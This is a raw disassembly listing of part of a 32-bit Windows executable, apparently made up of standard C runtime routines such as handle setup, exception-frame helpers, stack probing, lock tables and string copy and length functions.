  4235bc:	inc    ebp
  4235bd:	cmp    ebx,edi
  4235bf:	jl     0x423557
  4235c1:	xor    ebx,ebx
  4235c3:	mov    ecx,DWORD PTR ds:0x45d160
  4235c9:	lea    eax,[ebx+ebx*8]
  4235cc:	lea    esi,[ecx+eax*4]
  4235cf:	cmp    DWORD PTR [esi],0xffffffff
  4235d2:	jne    0x423643
  4235d4:	test   ebx,ebx
  4235d6:	mov    BYTE PTR [esi+0x4],0x81
  4235da:	jne    0x4235e6
  4235dc:	push   0xfffffff6
  4235de:	pop    eax
  4235df:	jmp    0x4235f0
  4235e1:	or     eax,0xffffffff
  4235e4:	jmp    0x42365f
  4235e6:	mov    eax,ebx
  4235e8:	dec    eax
  4235e9:	neg    eax
  4235eb:	sbb    eax,eax
  4235ed:	add    eax,0xfffffff5
  4235f0:	push   eax
  4235f1:	call   DWORD PTR ds:0x428038
  4235f7:	mov    edi,eax
  4235f9:	cmp    edi,0xffffffff
  4235fc:	je     0x42363d
  4235fe:	push   edi
  4235ff:	call   DWORD PTR ds:0x42805c
  423605:	test   eax,eax
  423607:	je     0x42363d
  423609:	and    eax,0xff
  42360e:	cmp    eax,0x2
  423611:	mov    DWORD PTR [esi],edi
  423613:	jne    0x42361b
  423615:	or     BYTE PTR [esi+0x4],0x40
  423619:	jmp    0x423624
  42361b:	cmp    eax,0x3
  42361e:	jne    0x423624
  423620:	or     BYTE PTR [esi+0x4],0x8
  423624:	lea    eax,[esi+0xc]
  423627:	push   0xfa0
  42362c:	push   eax
  42362d:	call   0x4248ed
  423632:	test   eax,eax
  423634:	pop    ecx
  423635:	pop    ecx
  423636:	je     0x4235e1
  423638:	inc    DWORD PTR [esi+0x8]
  42363b:	jmp    0x423647
  42363d:	or     BYTE PTR [esi+0x4],0x40
  423641:	jmp    0x423647
  423643:	or     BYTE PTR [esi+0x4],0x80
  423647:	inc    ebx
  423648:	cmp    ebx,0x3
  42364b:	jl     0x4235c3
  423651:	push   DWORD PTR ds:0x45d148
  423657:	call   DWORD PTR ds:0x428058
  42365d:	xor    eax,eax
  42365f:	pop    edi
  423660:	pop    esi
  423661:	pop    ebp
  423662:	pop    ebx
  423663:	add    esp,0x48
  423666:	ret    
  423667:	push   0xc
  423669:	push   0x4284a0
  42366e:	call   0x423858
  423673:	mov    DWORD PTR [ebp-0x1c],0x428ef8
  42367a:	cmp    DWORD PTR [ebp-0x1c],0x428ef8
  423681:	jae    0x4236a5
  423683:	and    DWORD PTR [ebp-0x4],0x0
  423687:	mov    eax,DWORD PTR [ebp-0x1c]
  42368a:	mov    eax,DWORD PTR [eax]
  42368c:	test   eax,eax
  42368e:	je     0x42369b
  423690:	call   eax
  423692:	jmp    0x42369b
  423694:	xor    eax,eax
  423696:	inc    eax
  423697:	ret    
  423698:	mov    esp,DWORD PTR [ebp-0x18]
  42369b:	or     DWORD PTR [ebp-0x4],0xffffffff
  42369f:	add    DWORD PTR [ebp-0x1c],0x4
  4236a3:	jmp    0x42367a
  4236a5:	call   0x423893
  4236aa:	ret    
  4236ab:	push   0xc
  4236ad:	push   0x4284b0
  4236b2:	call   0x423858
  4236b7:	mov    DWORD PTR [ebp-0x1c],0x428f00
  4236be:	cmp    DWORD PTR [ebp-0x1c],0x428f00
  4236c5:	jae    0x4236e9
  4236c7:	and    DWORD PTR [ebp-0x4],0x0
  4236cb:	mov    eax,DWORD PTR [ebp-0x1c]
  4236ce:	mov    eax,DWORD PTR [eax]
  4236d0:	test   eax,eax
  4236d2:	je     0x4236df
  4236d4:	call   eax
  4236d6:	jmp    0x4236df
  4236d8:	xor    eax,eax
  4236da:	inc    eax
  4236db:	ret    
  4236dc:	mov    esp,DWORD PTR [ebp-0x18]
  4236df:	or     DWORD PTR [ebp-0x4],0xffffffff
  4236e3:	add    DWORD PTR [ebp-0x1c],0x4
  4236e7:	jmp    0x4236be
  4236e9:	call   0x423893
  4236ee:	ret    
  4236ef:	call   0x423936
  4236f4:	mov    eax,ds:0x45c304
  4236f9:	cmp    eax,0xffffffff
  4236fc:	je     0x42370c
  4236fe:	push   eax
  4236ff:	call   DWORD PTR ds:0x428064
  423705:	or     DWORD PTR ds:0x45c304,0xffffffff
  42370c:	ret    
  42370d:	push   ebx
  42370e:	push   esi
  42370f:	call   DWORD PTR ds:0x428010
  423715:	push   DWORD PTR ds:0x45c304
  42371b:	mov    ebx,eax
  42371d:	call   DWORD PTR ds:0x428074
  423723:	mov    esi,eax
  423725:	test   esi,esi
  423727:	jne    0x423772
  423729:	push   0x88
  42372e:	push   0x1
  423730:	call   0x424978
  423735:	mov    esi,eax
  423737:	test   esi,esi
  423739:	pop    ecx
  42373a:	pop    ecx
  42373b:	je     0x42376a
  42373d:	push   esi
  42373e:	push   DWORD PTR ds:0x45c304
  423744:	call   DWORD PTR ds:0x428070
  42374a:	test   eax,eax
  42374c:	je     0x42376a
  42374e:	mov    DWORD PTR [esi+0x54],0x45c258
  423755:	mov    DWORD PTR [esi+0x14],0x1
  42375c:	call   DWORD PTR ds:0x42806c
  423762:	or     DWORD PTR [esi+0x4],0xffffffff
  423766:	mov    DWORD PTR [esi],eax
  423768:	jmp    0x423772
  42376a:	push   0x10
  42376c:	call   0x422920
  423771:	pop    ecx
  423772:	push   ebx
  423773:	call   DWORD PTR ds:0x428068
  423779:	mov    eax,esi
  42377b:	pop    esi
  42377c:	pop    ebx
  42377d:	ret    
  42377e:	call   0x4238ed
  423783:	test   eax,eax
  423785:	je     0x423797
  423787:	call   DWORD PTR ds:0x428078
  42378d:	cmp    eax,0xffffffff
  423790:	mov    ds:0x45c304,eax
  423795:	jne    0x42379f
  423797:	call   0x4236ef
  42379c:	xor    eax,eax
  42379e:	ret    
  42379f:	push   esi
  4237a0:	push   0x88
  4237a5:	push   0x1
  4237a7:	call   0x424978
  4237ac:	mov    esi,eax
  4237ae:	test   esi,esi
  4237b0:	pop    ecx
  4237b1:	pop    ecx
  4237b2:	je     0x4237e4
  4237b4:	push   esi
  4237b5:	push   DWORD PTR ds:0x45c304
  4237bb:	call   DWORD PTR ds:0x428070
  4237c1:	test   eax,eax
  4237c3:	je     0x4237e4
  4237c5:	mov    DWORD PTR [esi+0x54],0x45c258
  4237cc:	mov    DWORD PTR [esi+0x14],0x1
  4237d3:	call   DWORD PTR ds:0x42806c
  4237d9:	or     DWORD PTR [esi+0x4],0xffffffff
  4237dd:	mov    DWORD PTR [esi],eax
  4237df:	xor    eax,eax
  4237e1:	inc    eax
  4237e2:	pop    esi
  4237e3:	ret    
  4237e4:	call   0x4236ef
  4237e9:	xor    eax,eax
  4237eb:	pop    esi
  4237ec:	ret    
  4237ed:	cmp    DWORD PTR ds:0x45cac4,0x2
  4237f4:	jne    0x423803
  4237f6:	cmp    DWORD PTR ds:0x45cad0,0x5
  4237fd:	jb     0x423803
  4237ff:	xor    eax,eax
  423801:	inc    eax
  423802:	ret    
  423803:	push   0x3
  423805:	pop    eax
  423806:	ret    
  423807:	xor    eax,eax
  423809:	cmp    DWORD PTR [esp+0x4],eax
  42380d:	push   0x0
  42380f:	sete   al
  423812:	push   0x1000
  423817:	push   eax
  423818:	call   DWORD PTR ds:0x428080
  42381e:	test   eax,eax
  423820:	mov    ds:0x45d140,eax
  423825:	je     0x423851
  423827:	call   0x4237ed
  42382c:	cmp    eax,0x3
  42382f:	mov    ds:0x45d144,eax
  423834:	jne    0x423854
  423836:	push   0x3f8
  42383b:	call   0x424bfa
  423840:	test   eax,eax
  423842:	pop    ecx
  423843:	jne    0x423854
  423845:	push   DWORD PTR ds:0x45d140
  42384b:	call   DWORD PTR ds:0x42807c
  423851:	xor    eax,eax
  423853:	ret    
  423854:	xor    eax,eax
  423856:	inc    eax
  423857:	ret    
  423858:	push   0x425728
  42385d:	mov    eax,fs:0x0
  423863:	push   eax
  423864:	mov    eax,DWORD PTR [esp+0x10]
  423868:	mov    DWORD PTR [esp+0x10],ebp
  42386c:	lea    ebp,[esp+0x10]
  423870:	sub    esp,eax
  423872:	push   ebx
  423873:	push   esi
  423874:	push   edi
  423875:	mov    eax,DWORD PTR [ebp-0x8]
  423878:	mov    DWORD PTR [ebp-0x18],esp
  42387b:	push   eax
  42387c:	mov    eax,DWORD PTR [ebp-0x4]
  42387f:	mov    DWORD PTR [ebp-0x4],0xffffffff
  423886:	mov    DWORD PTR [ebp-0x8],eax
  423889:	lea    eax,[ebp-0x10]
  42388c:	mov    fs:0x0,eax
  423892:	ret    
  423893:	mov    ecx,DWORD PTR [ebp-0x10]
  423896:	mov    DWORD PTR fs:0x0,ecx
  42389d:	pop    ecx
  42389e:	pop    edi
  42389f:	pop    esi
  4238a0:	pop    ebx
  4238a1:	leave  
  4238a2:	push   ecx
  4238a3:	ret    
  4238a4:	int3   
  4238a5:	int3   
  4238a6:	int3   
  4238a7:	int3   
  4238a8:	int3   
  4238a9:	int3   
  4238aa:	int3   
  4238ab:	int3   
  4238ac:	int3   
  4238ad:	int3   
  4238ae:	int3   
  4238af:	int3   
  4238b0:	cmp    eax,0x1000
  4238b5:	jae    0x4238c5
  4238b7:	neg    eax
  4238b9:	add    eax,esp
  4238bb:	add    eax,0x4
  4238be:	test   DWORD PTR [eax],eax
  4238c0:	xchg   esp,eax
  4238c1:	mov    eax,DWORD PTR [eax]
  4238c3:	push   eax
  4238c4:	ret    
  4238c5:	push   ecx
  4238c6:	lea    ecx,[esp+0x8]
  4238ca:	sub    ecx,0x1000
  4238d0:	sub    eax,0x1000
  4238d5:	test   DWORD PTR [ecx],eax
  4238d7:	cmp    eax,0x1000
  4238dc:	jae    0x4238ca
  4238de:	sub    ecx,eax
  4238e0:	mov    eax,esp
  4238e2:	test   DWORD PTR [ecx],eax
  4238e4:	mov    esp,ecx
  4238e6:	mov    ecx,DWORD PTR [eax]
  4238e8:	mov    eax,DWORD PTR [eax+0x4]
  4238eb:	push   eax
  4238ec:	ret    
  4238ed:	push   esi
  4238ee:	push   edi
  4238ef:	xor    esi,esi
  4238f1:	mov    edi,0x45cc20
  4238f6:	cmp    DWORD PTR [esi*8+0x45c314],0x1
  4238fe:	jne    0x42391e
  423900:	lea    eax,[esi*8+0x45c310]
  423907:	mov    DWORD PTR [eax],edi
  423909:	push   0xfa0
  42390e:	push   DWORD PTR [eax]
  423910:	add    edi,0x18
  423913:	call   0x4248ed
  423918:	test   eax,eax
  42391a:	pop    ecx
  42391b:	pop    ecx
  42391c:	je     0x42392a
  42391e:	inc    esi
  42391f:	cmp    esi,0x24
  423922:	jl     0x4238f6
  423924:	xor    eax,eax
  423926:	inc    eax
  423927:	pop    edi
  423928:	pop    esi
  423929:	ret    
  42392a:	and    DWORD PTR [esi*8+0x45c310],0x0
  423932:	xor    eax,eax
  423934:	jmp    0x423927
  423936:	push   ebx
  423937:	mov    ebx,DWORD PTR ds:0x428060
  42393d:	push   esi
  42393e:	mov    esi,0x45c310
  423943:	push   edi
  423944:	mov    edi,DWORD PTR [esi]
  423946:	test   edi,edi
  423948:	je     0x42395d
  42394a:	cmp    DWORD PTR [esi+0x4],0x1
  42394e:	je     0x42395d
  423950:	push   edi
  423951:	call   ebx
  423953:	push   edi
  423954:	call   0x42446a
  423959:	and    DWORD PTR [esi],0x0
  42395c:	pop    ecx
  42395d:	add    esi,0x8
  423960:	cmp    esi,0x45c430
  423966:	jl     0x423944
  423968:	mov    esi,0x45c310
  42396d:	pop    edi
  42396e:	mov    eax,DWORD PTR [esi]
  423970:	test   eax,eax
  423972:	je     0x42397d
  423974:	cmp    DWORD PTR [esi+0x4],0x1
  423978:	jne    0x42397d
  42397a:	push   eax
  42397b:	call   ebx
  42397d:	add    esi,0x8
  423980:	cmp    esi,0x45c430
  423986:	jl     0x42396e
  423988:	pop    esi
  423989:	pop    ebx
  42398a:	ret    
  42398b:	push   ebp
  42398c:	mov    ebp,esp
  42398e:	mov    eax,DWORD PTR [ebp+0x8]
  423991:	push   DWORD PTR [eax*8+0x45c310]
  423998:	call   DWORD PTR ds:0x42808c
  42399e:	pop    ebp
  42399f:	ret    
  4239a0:	push   ebp
  4239a1:	mov    ebp,esp
  4239a3:	push   esi
  4239a4:	mov    esi,DWORD PTR [ebp+0x8]
  4239a7:	lea    esi,[esi*8+0x45c310]
  4239ae:	cmp    DWORD PTR [esi],0x0
  4239b1:	je     0x4239b8
  4239b3:	xor    eax,eax
  4239b5:	inc    eax
  4239b6:	jmp    0x423a1c
  4239b8:	push   edi
  4239b9:	push   0x18
  4239bb:	call   0x424582
  4239c0:	mov    edi,eax
  4239c2:	test   edi,edi
  4239c4:	pop    ecx
  4239c5:	jne    0x4239d6
  4239c7:	call   0x425800
  4239cc:	mov    DWORD PTR [eax],0xc
  4239d2:	xor    eax,eax
  4239d4:	jmp    0x423a1b
  4239d6:	push   0xa
  4239d8:	call   0x423a1f
  4239dd:	cmp    DWORD PTR [esi],0x0
  4239e0:	pop    ecx
  4239e1:	jne    0x423a09
  4239e3:	push   0xfa0
  4239e8:	push   edi
  4239e9:	call   0x4248ed
  4239ee:	test   eax,eax
  4239f0:	pop    ecx
  4239f1:	pop    ecx
  4239f2:	jne    0x423a05
  4239f4:	push   edi
  4239f5:	call   0x42446a
  4239fa:	push   0xa
  4239fc:	call   0x42398b
  423a01:	pop    ecx
  423a02:	pop    ecx
  423a03:	jmp    0x4239c7
  423a05:	mov    DWORD PTR [esi],edi
  423a07:	jmp    0x423a10
  423a09:	push   edi
  423a0a:	call   0x42446a
  423a0f:	pop    ecx
  423a10:	push   0xa
  423a12:	call   0x42398b
  423a17:	xor    eax,eax
  423a19:	pop    ecx
  423a1a:	inc    eax
  423a1b:	pop    edi
  423a1c:	pop    esi
  423a1d:	pop    ebp
  423a1e:	ret    
  423a1f:	push   ebp
  423a20:	mov    ebp,esp
  423a22:	mov    eax,DWORD PTR [ebp+0x8]
  423a25:	push   esi
  423a26:	lea    esi,[eax*8+0x45c310]
  423a2d:	cmp    DWORD PTR [esi],0x0
  423a30:	jne    0x423a45
  423a32:	push   eax
  423a33:	call   0x4239a0
  423a38:	test   eax,eax
  423a3a:	pop    ecx
  423a3b:	jne    0x423a45
  423a3d:	push   0x11
  423a3f:	call   0x422920
  423a44:	pop    ecx
  423a45:	push   DWORD PTR [esi]
  423a47:	call   DWORD PTR ds:0x428090
  423a4d:	pop    esi
  423a4e:	pop    ebp
  423a4f:	ret    
  423a50:	push   esi
  423a51:	push   DWORD PTR ds:0x45d268
  423a57:	call   0x4259b6
  423a5c:	pop    ecx
  423a5d:	mov    ecx,DWORD PTR ds:0x45d264
  423a63:	mov    esi,eax
  423a65:	mov    eax,ds:0x45d268
  423a6a:	mov    edx,ecx
  423a6c:	sub    edx,eax
  423a6e:	add    edx,0x4
  423a71:	cmp    esi,edx
  423a73:	jae    0x423ac3
  423a75:	mov    ecx,0x800
  423a7a:	cmp    esi,ecx
  423a7c:	jae    0x423a80
  423a7e:	mov    ecx,esi
  423a80:	add    ecx,esi
  423a82:	push   ecx
  423a83:	push   eax
  423a84:	call   0x425809
  423a89:	test   eax,eax
  423a8b:	pop    ecx
  423a8c:	pop    ecx
  423a8d:	jne    0x423aa6
  423a8f:	add    esi,0x10
  423a92:	push   esi
  423a93:	push   DWORD PTR ds:0x45d268
  423a99:	call   0x425809
  423a9e:	test   eax,eax
  423aa0:	pop    ecx
  423aa1:	pop    ecx
  423aa2:	jne    0x423aa6
  423aa4:	pop    esi
  423aa5:	ret    
  423aa6:	mov    ecx,DWORD PTR ds:0x45d264
  423aac:	sub    ecx,DWORD PTR ds:0x45d268
  423ab2:	mov    ds:0x45d268,eax
  423ab7:	sar    ecx,0x2
  423aba:	lea    ecx,[eax+ecx*4]
  423abd:	mov    DWORD PTR ds:0x45d264,ecx
  423ac3:	mov    DWORD PTR [ecx],edi
  423ac5:	add    DWORD PTR ds:0x45d264,0x4
  423acc:	mov    eax,edi
  423ace:	pop    esi
  423acf:	ret    
  423ad0:	push   0x80
  423ad5:	call   0x424582
  423ada:	test   eax,eax
  423adc:	pop    ecx
  423add:	mov    ds:0x45d268,eax
  423ae2:	jne    0x423ae8
  423ae4:	push   0x18
  423ae6:	pop    eax
  423ae7:	ret    
  423ae8:	and    DWORD PTR [eax],0x0
  423aeb:	mov    eax,ds:0x45d268
  423af0:	mov    ds:0x45d264,eax
  423af5:	xor    eax,eax
  423af7:	ret    
  423af8:	push   0xc
  423afa:	push   0x4284c0
  423aff:	call   0x423858
  423b04:	call   0x422b6b
  423b09:	and    DWORD PTR [ebp-0x4],0x0
  423b0d:	mov    edi,DWORD PTR [ebp+0x8]
  423b10:	call   0x423a50
  423b15:	mov    DWORD PTR [ebp-0x1c],eax
  423b18:	or     DWORD PTR [ebp-0x4],0xffffffff
  423b1c:	call   0x423b2a
  423b21:	mov    eax,DWORD PTR [ebp-0x1c]
  423b24:	call   0x423893
  423b29:	ret    
  423b2a:	call   0x422b74
  423b2f:	ret    
  423b30:	push   DWORD PTR [esp+0x4]
  423b34:	call   0x423af8
  423b39:	neg    eax
  423b3b:	sbb    eax,eax
  423b3d:	neg    eax
  423b3f:	pop    ecx
  423b40:	dec    eax
  423b41:	ret    
  423b42:	push   ebp
  423b43:	mov    ebp,esp
  423b45:	sub    esp,0x10
  423b48:	push   ebx
  423b49:	xor    ebx,ebx
  423b4b:	cmp    DWORD PTR ds:0x45cd70,ebx
  423b51:	push   esi
  423b52:	push   edi
  423b53:	jne    0x423bc2
  423b55:	push   0x428530
  423b5a:	call   DWORD PTR ds:0x428094
  423b60:	mov    edi,eax
  423b62:	cmp    edi,ebx
  423b64:	je     0x423bfd
  423b6a:	mov    esi,DWORD PTR ds:0x428018
  423b70:	push   0x428524
  423b75:	push   edi
  423b76:	call   esi
  423b78:	test   eax,eax
  423b7a:	mov    ds:0x45cd70,eax
  423b7f:	je     0x423bfd
  423b81:	push   0x428514
  423b86:	push   edi
  423b87:	call   esi
  423b89:	push   0x428500
  423b8e:	push   edi
  423b8f:	mov    ds:0x45cd74,eax
  423b94:	call   esi
  423b96:	cmp    DWORD PTR ds:0x45cac4,0x2
  423b9d:	mov    ds:0x45cd78,eax
  423ba2:	jne    0x423bc2
  423ba4:	push   0x4284e4
  423ba9:	push   edi
  423baa:	call   esi
  423bac:	test   eax,eax
  423bae:	mov    ds:0x45cd80,eax
  423bb3:	je     0x423bc2
  423bb5:	push   0x4284cc
  423bba:	push   edi
  423bbb:	call   esi
  423bbd:	mov    ds:0x45cd7c,eax
  423bc2:	mov    eax,ds:0x45cd7c
  423bc7:	test   eax,eax
  423bc9:	je     0x423c07
  423bcb:	call   eax
  423bcd:	test   eax,eax
  423bcf:	je     0x423bee
  423bd1:	lea    ecx,[ebp-0x4]
  423bd4:	push   ecx
  423bd5:	push   0xc
  423bd7:	lea    ecx,[ebp-0x10]
  423bda:	push   ecx
  423bdb:	push   0x1
  423bdd:	push   eax
  423bde:	call   DWORD PTR ds:0x45cd80
  423be4:	test   eax,eax
  423be6:	je     0x423bee
  423be8:	test   BYTE PTR [ebp-0x8],0x1
  423bec:	jne    0x423c07
  423bee:	cmp    DWORD PTR ds:0x45cad0,0x4
  423bf5:	jb     0x423c01
  423bf7:	or     BYTE PTR [ebp+0x12],0x20
  423bfb:	jmp    0x423c26
  423bfd:	xor    eax,eax
  423bff:	jmp    0x423c36
  423c01:	or     BYTE PTR [ebp+0x12],0x4
  423c05:	jmp    0x423c26
  423c07:	mov    eax,ds:0x45cd74
  423c0c:	test   eax,eax
  423c0e:	je     0x423c26
  423c10:	call   eax
  423c12:	mov    ebx,eax
  423c14:	test   ebx,ebx
  423c16:	je     0x423c26
  423c18:	mov    eax,ds:0x45cd78
  423c1d:	test   eax,eax
  423c1f:	je     0x423c26
  423c21:	push   ebx
  423c22:	call   eax
  423c24:	mov    ebx,eax
  423c26:	push   DWORD PTR [ebp+0x10]
  423c29:	push   DWORD PTR [ebp+0xc]
  423c2c:	push   DWORD PTR [ebp+0x8]
  423c2f:	push   ebx
  423c30:	call   DWORD PTR ds:0x45cd70
  423c36:	pop    edi
  423c37:	pop    esi
  423c38:	pop    ebx
  423c39:	leave  
  423c3a:	ret    
  423c3b:	int3   
  423c3c:	int3   
  423c3d:	int3   
  423c3e:	int3   
  423c3f:	int3   
  423c40:	push   edi
  423c41:	mov    edi,DWORD PTR [esp+0x8]
  423c45:	jmp    0x423cb5
  423c47:	lea    esp,[esp+0x0]
  423c4e:	mov    edi,edi
  423c50:	mov    ecx,DWORD PTR [esp+0x4]
  423c54:	push   edi
  423c55:	test   ecx,0x3
  423c5b:	je     0x423c70
  423c5d:	mov    al,BYTE PTR [ecx]
  423c5f:	add    ecx,0x1
  423c62:	test   al,al
  423c64:	je     0x423ca3
  423c66:	test   ecx,0x3
  423c6c:	jne    0x423c5d
  423c6e:	mov    edi,edi
  423c70:	mov    eax,DWORD PTR [ecx]
  423c72:	mov    edx,0x7efefeff
  423c77:	add    edx,eax
  423c79:	xor    eax,0xffffffff
  423c7c:	xor    eax,edx
  423c7e:	add    ecx,0x4
  423c81:	test   eax,0x81010100
  423c86:	je     0x423c70
  423c88:	mov    eax,DWORD PTR [ecx-0x4]
  423c8b:	test   al,al
  423c8d:	je     0x423cb2
  423c8f:	test   ah,ah
  423c91:	je     0x423cad
  423c93:	test   eax,0xff0000
  423c98:	je     0x423ca8
  423c9a:	test   eax,0xff000000
  423c9f:	je     0x423ca3
  423ca1:	jmp    0x423c70
  423ca3:	lea    edi,[ecx-0x1]
  423ca6:	jmp    0x423cb5
  423ca8:	lea    edi,[ecx-0x2]
  423cab:	jmp    0x423cb5
  423cad:	lea    edi,[ecx-0x3]
  423cb0:	jmp    0x423cb5
  423cb2:	lea    edi,[ecx-0x4]
  423cb5:	mov    ecx,DWORD PTR [esp+0xc]
  423cb9:	test   ecx,0x3
  423cbf:	je     0x423cde
  423cc1:	mov    dl,BYTE PTR [ecx]
  423cc3:	add    ecx,0x1
  423cc6:	test   dl,dl
  423cc8:	je     0x423d30
  423cca:	mov    BYTE PTR [edi],dl
  423ccc:	add    edi,0x1
  423ccf:	test   ecx,0x3
  423cd5:	jne    0x423cc1
  423cd7:	jmp    0x423cde
  423cd9:	mov    DWORD PTR [edi],edx
  423cdb:	add    edi,0x4
  423cde:	mov    edx,0x7efefeff
  423ce3:	mov    eax,DWORD PTR [ecx]
  423ce5:	add    edx,eax
  423ce7:	xor    eax,0xffffffff
  423cea:	xor    eax,edx
  423cec:	mov    edx,DWORD PTR [ecx]
  423cee:	add    ecx,0x4
  423cf1:	test   eax,0x81010100
  423cf6:	je     0x423cd9
  423cf8:	test   dl,dl
  423cfa:	je     0x423d30
  423cfc:	test   dh,dh
  423cfe:	je     0x423d27
  423d00:	test   edx,0xff0000
  423d06:	je     0x423d1a
  423d08:	test   edx,0xff000000
  423d0e:	je     0x423d12
  423d10:	jmp    0x423cd9
  423d12:	mov    DWORD PTR [edi],edx
  423d14:	mov    eax,DWORD PTR [esp+0x8]
  423d18:	pop    edi
  423d19:	ret    
  423d1a:	mov    WORD PTR [edi],dx
  423d1d:	mov    eax,DWORD PTR [esp+0x8]
  423d21:	mov    BYTE PTR [edi+0x2],0x0
  423d25:	pop    edi
  423d26:	ret    
  423d27:	mov    WORD PTR [edi],dx
  423d2a:	mov    eax,DWORD PTR [esp+0x8]
  423d2e:	pop    edi
  423d2f:	ret    
  423d30:	mov    BYTE PTR [edi],dl
  423d32:	mov    eax,DWORD PTR [esp+0x8]
  423d36:	pop    edi
  423d37:	ret    
  423d38:	int3   
  423d39:	int3   
  423d3a:	int3   
  423d3b:	int3   
  423d3c:	int3   
  423d3d:	int3   
  423d3e:	int3   
  423d3f:	int3   
  423d40:	mov    ecx,DWORD PTR [esp+0xc]
  423d44:	push   edi
  423d45:	test   ecx,ecx
  423d47:	je     0x423ddf
  423d4d:	push   esi
  423d4e:	push   ebx
  423d4f:	mov    ebx,ecx
  423d51:	mov    esi,DWORD PTR [esp+0x14]
  423d55:	test   esi,0x3
  423d5b:	mov    edi,DWORD PTR [esp+0x10]
  423d5f:	jne    0x423d6c
  423d61:	shr    ecx,0x2
  423d64:	jne    0x423def
  423d6a:	jmp    0x423d93
  423d6c:	mov    al,BYTE PTR [esi]
  423d6e:	add    esi,0x1
  423d71:	mov    BYTE PTR [edi],al
  423d73:	add    edi,0x1
  423d76:	sub    ecx,0x1
  423d79:	je     0x423da6
  423d7b:	test   al,al
  423d7d:	je     0x423dae
  423d7f:	test   esi,0x3
  423d85:	jne    0x423d6c
  423d87:	mov    ebx,ecx
  423d89:	shr    ecx,0x2
  423d8c:	jne    0x423def
  423d8e:	and    ebx,0x3
  423d91:	je     0x423da6
  423d93:	mov    al,BYTE PTR [esi]
  423d95:	add    esi,0x1
  423d98:	mov    BYTE PTR [edi],al
  423d9a:	add    edi,0x1
  423d9d:	test   al,al
  423d9f:	je     0x423dd8
  423da1:	sub    ebx,0x1
  423da4:	jne    0x423d93
  423da6:	mov    eax,DWORD PTR [esp+0x10]
  423daa:	pop    ebx
  423dab:	pop    esi
  423dac:	pop    edi
  423dad:	ret    
  423dae:	test   edi,0x3
  423db4:	je     0x423dcc
  423db6:	mov    BYTE PTR [edi],al
  423db8:	add    edi,0x1
  423dbb:	sub    ecx,0x1
  423dbe:	je     0x423e5c
  423dc4:	test   edi,0x3
  423dca:	jne    0x423db6
  423dcc:	mov    ebx,ecx
  423dce:	shr    ecx,0x2
  423dd1:	jne    0x423e47
  423dd3:	mov    BYTE PTR [edi],al
  423dd5:	add    edi,0x1
  423dd8:	sub    ebx,0x1
  423ddb:	jne    0x423dd3
  423ddd:	pop    ebx
  423dde:	pop    esi
  423ddf:	mov    eax,DWORD PTR [esp+0x8]
  423de3:	pop    edi
  423de4:	ret    
  423de5:	mov    DWORD PTR [edi],edx
  423de7:	add    edi,0x4
  423dea:	sub    ecx,0x1
  423ded:	je     0x423d8e
  423def:	mov    edx,0x7efefeff
  423df4:	mov    eax,DWORD PTR [esi]
  423df6:	add    edx,eax
  423df8:	xor    eax,0xffffffff
  423dfb:	xor    eax,edx
  423dfd:	mov    edx,DWORD PTR [esi]
  423dff:	add    esi,0x4
  423e02:	test   eax,0x81010100
  423e07:	je     0x423de5
  423e09:	test   dl,dl
  423e0b:	je     0x423e39
  423e0d:	test   dh,dh
  423e0f:	je     0x423e2f
  423e11:	test   edx,0xff0000
  423e17:	je     0x423e25
  423e19:	test   edx,0xff000000
  423e1f:	jne    0x423de5
  423e21:	mov    DWORD PTR [edi],edx
  423e23:	jmp    0x423e3d
  423e25:	and    edx,0xffff
  423e2b:	mov    DWORD PTR [edi],edx
  423e2d:	jmp    0x423e3d
  423e2f:	and    edx,0xff
  423e35:	mov    DWORD PTR [edi],edx
  423e37:	jmp    0x423e3d
  423e39:	xor    edx,edx
  423e3b:	mov    DWORD PTR [edi],edx
  423e3d:	add    edi,0x4
  423e40:	xor    eax,eax
  423e42:	sub    ecx,0x1
  423e45:	je     0x423e53
  423e47:	xor    eax,eax
  423e49:	mov    DWORD PTR [edi],eax
  423e4b:	add    edi,0x4
  423e4e:	sub    ecx,0x1
  423e51:	jne    0x423e49
  423e53:	and    ebx,0x3
  423e56:	jne    0x423dd3
  423e5c:	mov    eax,DWORD PTR [esp+0x10]
  423e60:	pop    ebx
  423e61:	pop    esi
  423e62:	pop    edi
  423e63:	ret    
  423e64:	int3   
  423e65:	int3   
  423e66:	int3   
  423e67:	int3   
  423e68:	int3   
  423e69:	int3   
  423e6a:	int3   
  423e6b:	int3   
  423e6c:	int3   
  423e6d:	int3   
  423e6e:	int3   
  423e6f:	int3   
  423e70:	mov    ecx,DWORD PTR [esp+0x4]
  423e74:	test   ecx,0x3
  423e7a:	je     0x423ea0
  423e7c:	mov    al,BYTE PTR [ecx]
  423e7e:	add    ecx,0x1
  423e81:	test   al,al
  423e83:	je     0x423ed3
  423e85:	test   ecx,0x3
  423e8b:	jne    0x423e7c
  423e8d:	add    eax,0x0
  423e92:	lea    esp,[esp+0x0]
  423e99:	lea    esp,[esp+0x0]
  423ea0:	mov    eax,DWORD PTR [ecx]
  423ea2:	mov    edx,0x7efefeff
  423ea7:	add    edx,eax
  423ea9:	xor    eax,0xffffffff
  423eac:	xor    eax,edx
  423eae:	add    ecx,0x4
  423eb1:	test   eax,0x81010100
  423eb6:	je     0x423ea0
  423eb8:	mov    eax,DWORD PTR [ecx-0x4]
  423ebb:	test   al,al
  423ebd:	je     0x423ef1
  423ebf:	test   ah,ah
  423ec1:	je     0x423ee7
  423ec3:	test   eax,0xff0000
  423ec8:	je     0x423edd
  423eca:	test   eax,0xff000000
  423ecf:	je     0x423ed3
  423ed1:	jmp    0x423ea0
  423ed3:	lea    eax,[ecx-0x1]
  423ed6:	mov    ecx,DWORD PTR [esp+0x4]
  423eda:	sub    eax,ecx
  423edc:	ret    
  423edd:	lea    eax,[ecx-0x2]
  423ee0:	mov    ecx,DWORD PTR [esp+0x4]
  423ee4:	sub    eax,ecx
  423ee6:	ret    
  423ee7:	lea    eax,[ecx-0x3]
  423eea:	mov    ecx,DWORD PTR [esp+0x4]
  423eee:	sub    eax,ecx
  423ef0:	ret    
  423ef1:	lea    eax,[ecx-0x4]
  423ef4:	mov    ecx,DWORD PTR [esp+0x4]
  423ef8:	sub    eax,ecx
  423efa:	ret    
  423efb:	push   0x8
  423efd:	push   0x428540
  423f02:	call   0x423858
  423f07:	and    DWORD PTR [ebp-0x4],0x0
  423f0b:	push   0x0
  423f0d:	push   0x1
  423f0f:	call   0x425a82
  423f14:	pop    ecx
  423f15:	pop    ecx
  423f16:	jmp    0x423f1f
  423f18:	xor    eax,eax
  423f1a:	inc    eax
  423f1b:	ret    
  423f1c:	mov    esp,DWORD PTR [ebp-0x18]
  423f1f:	or     DWORD PTR [ebp-0x4],0xffffffff
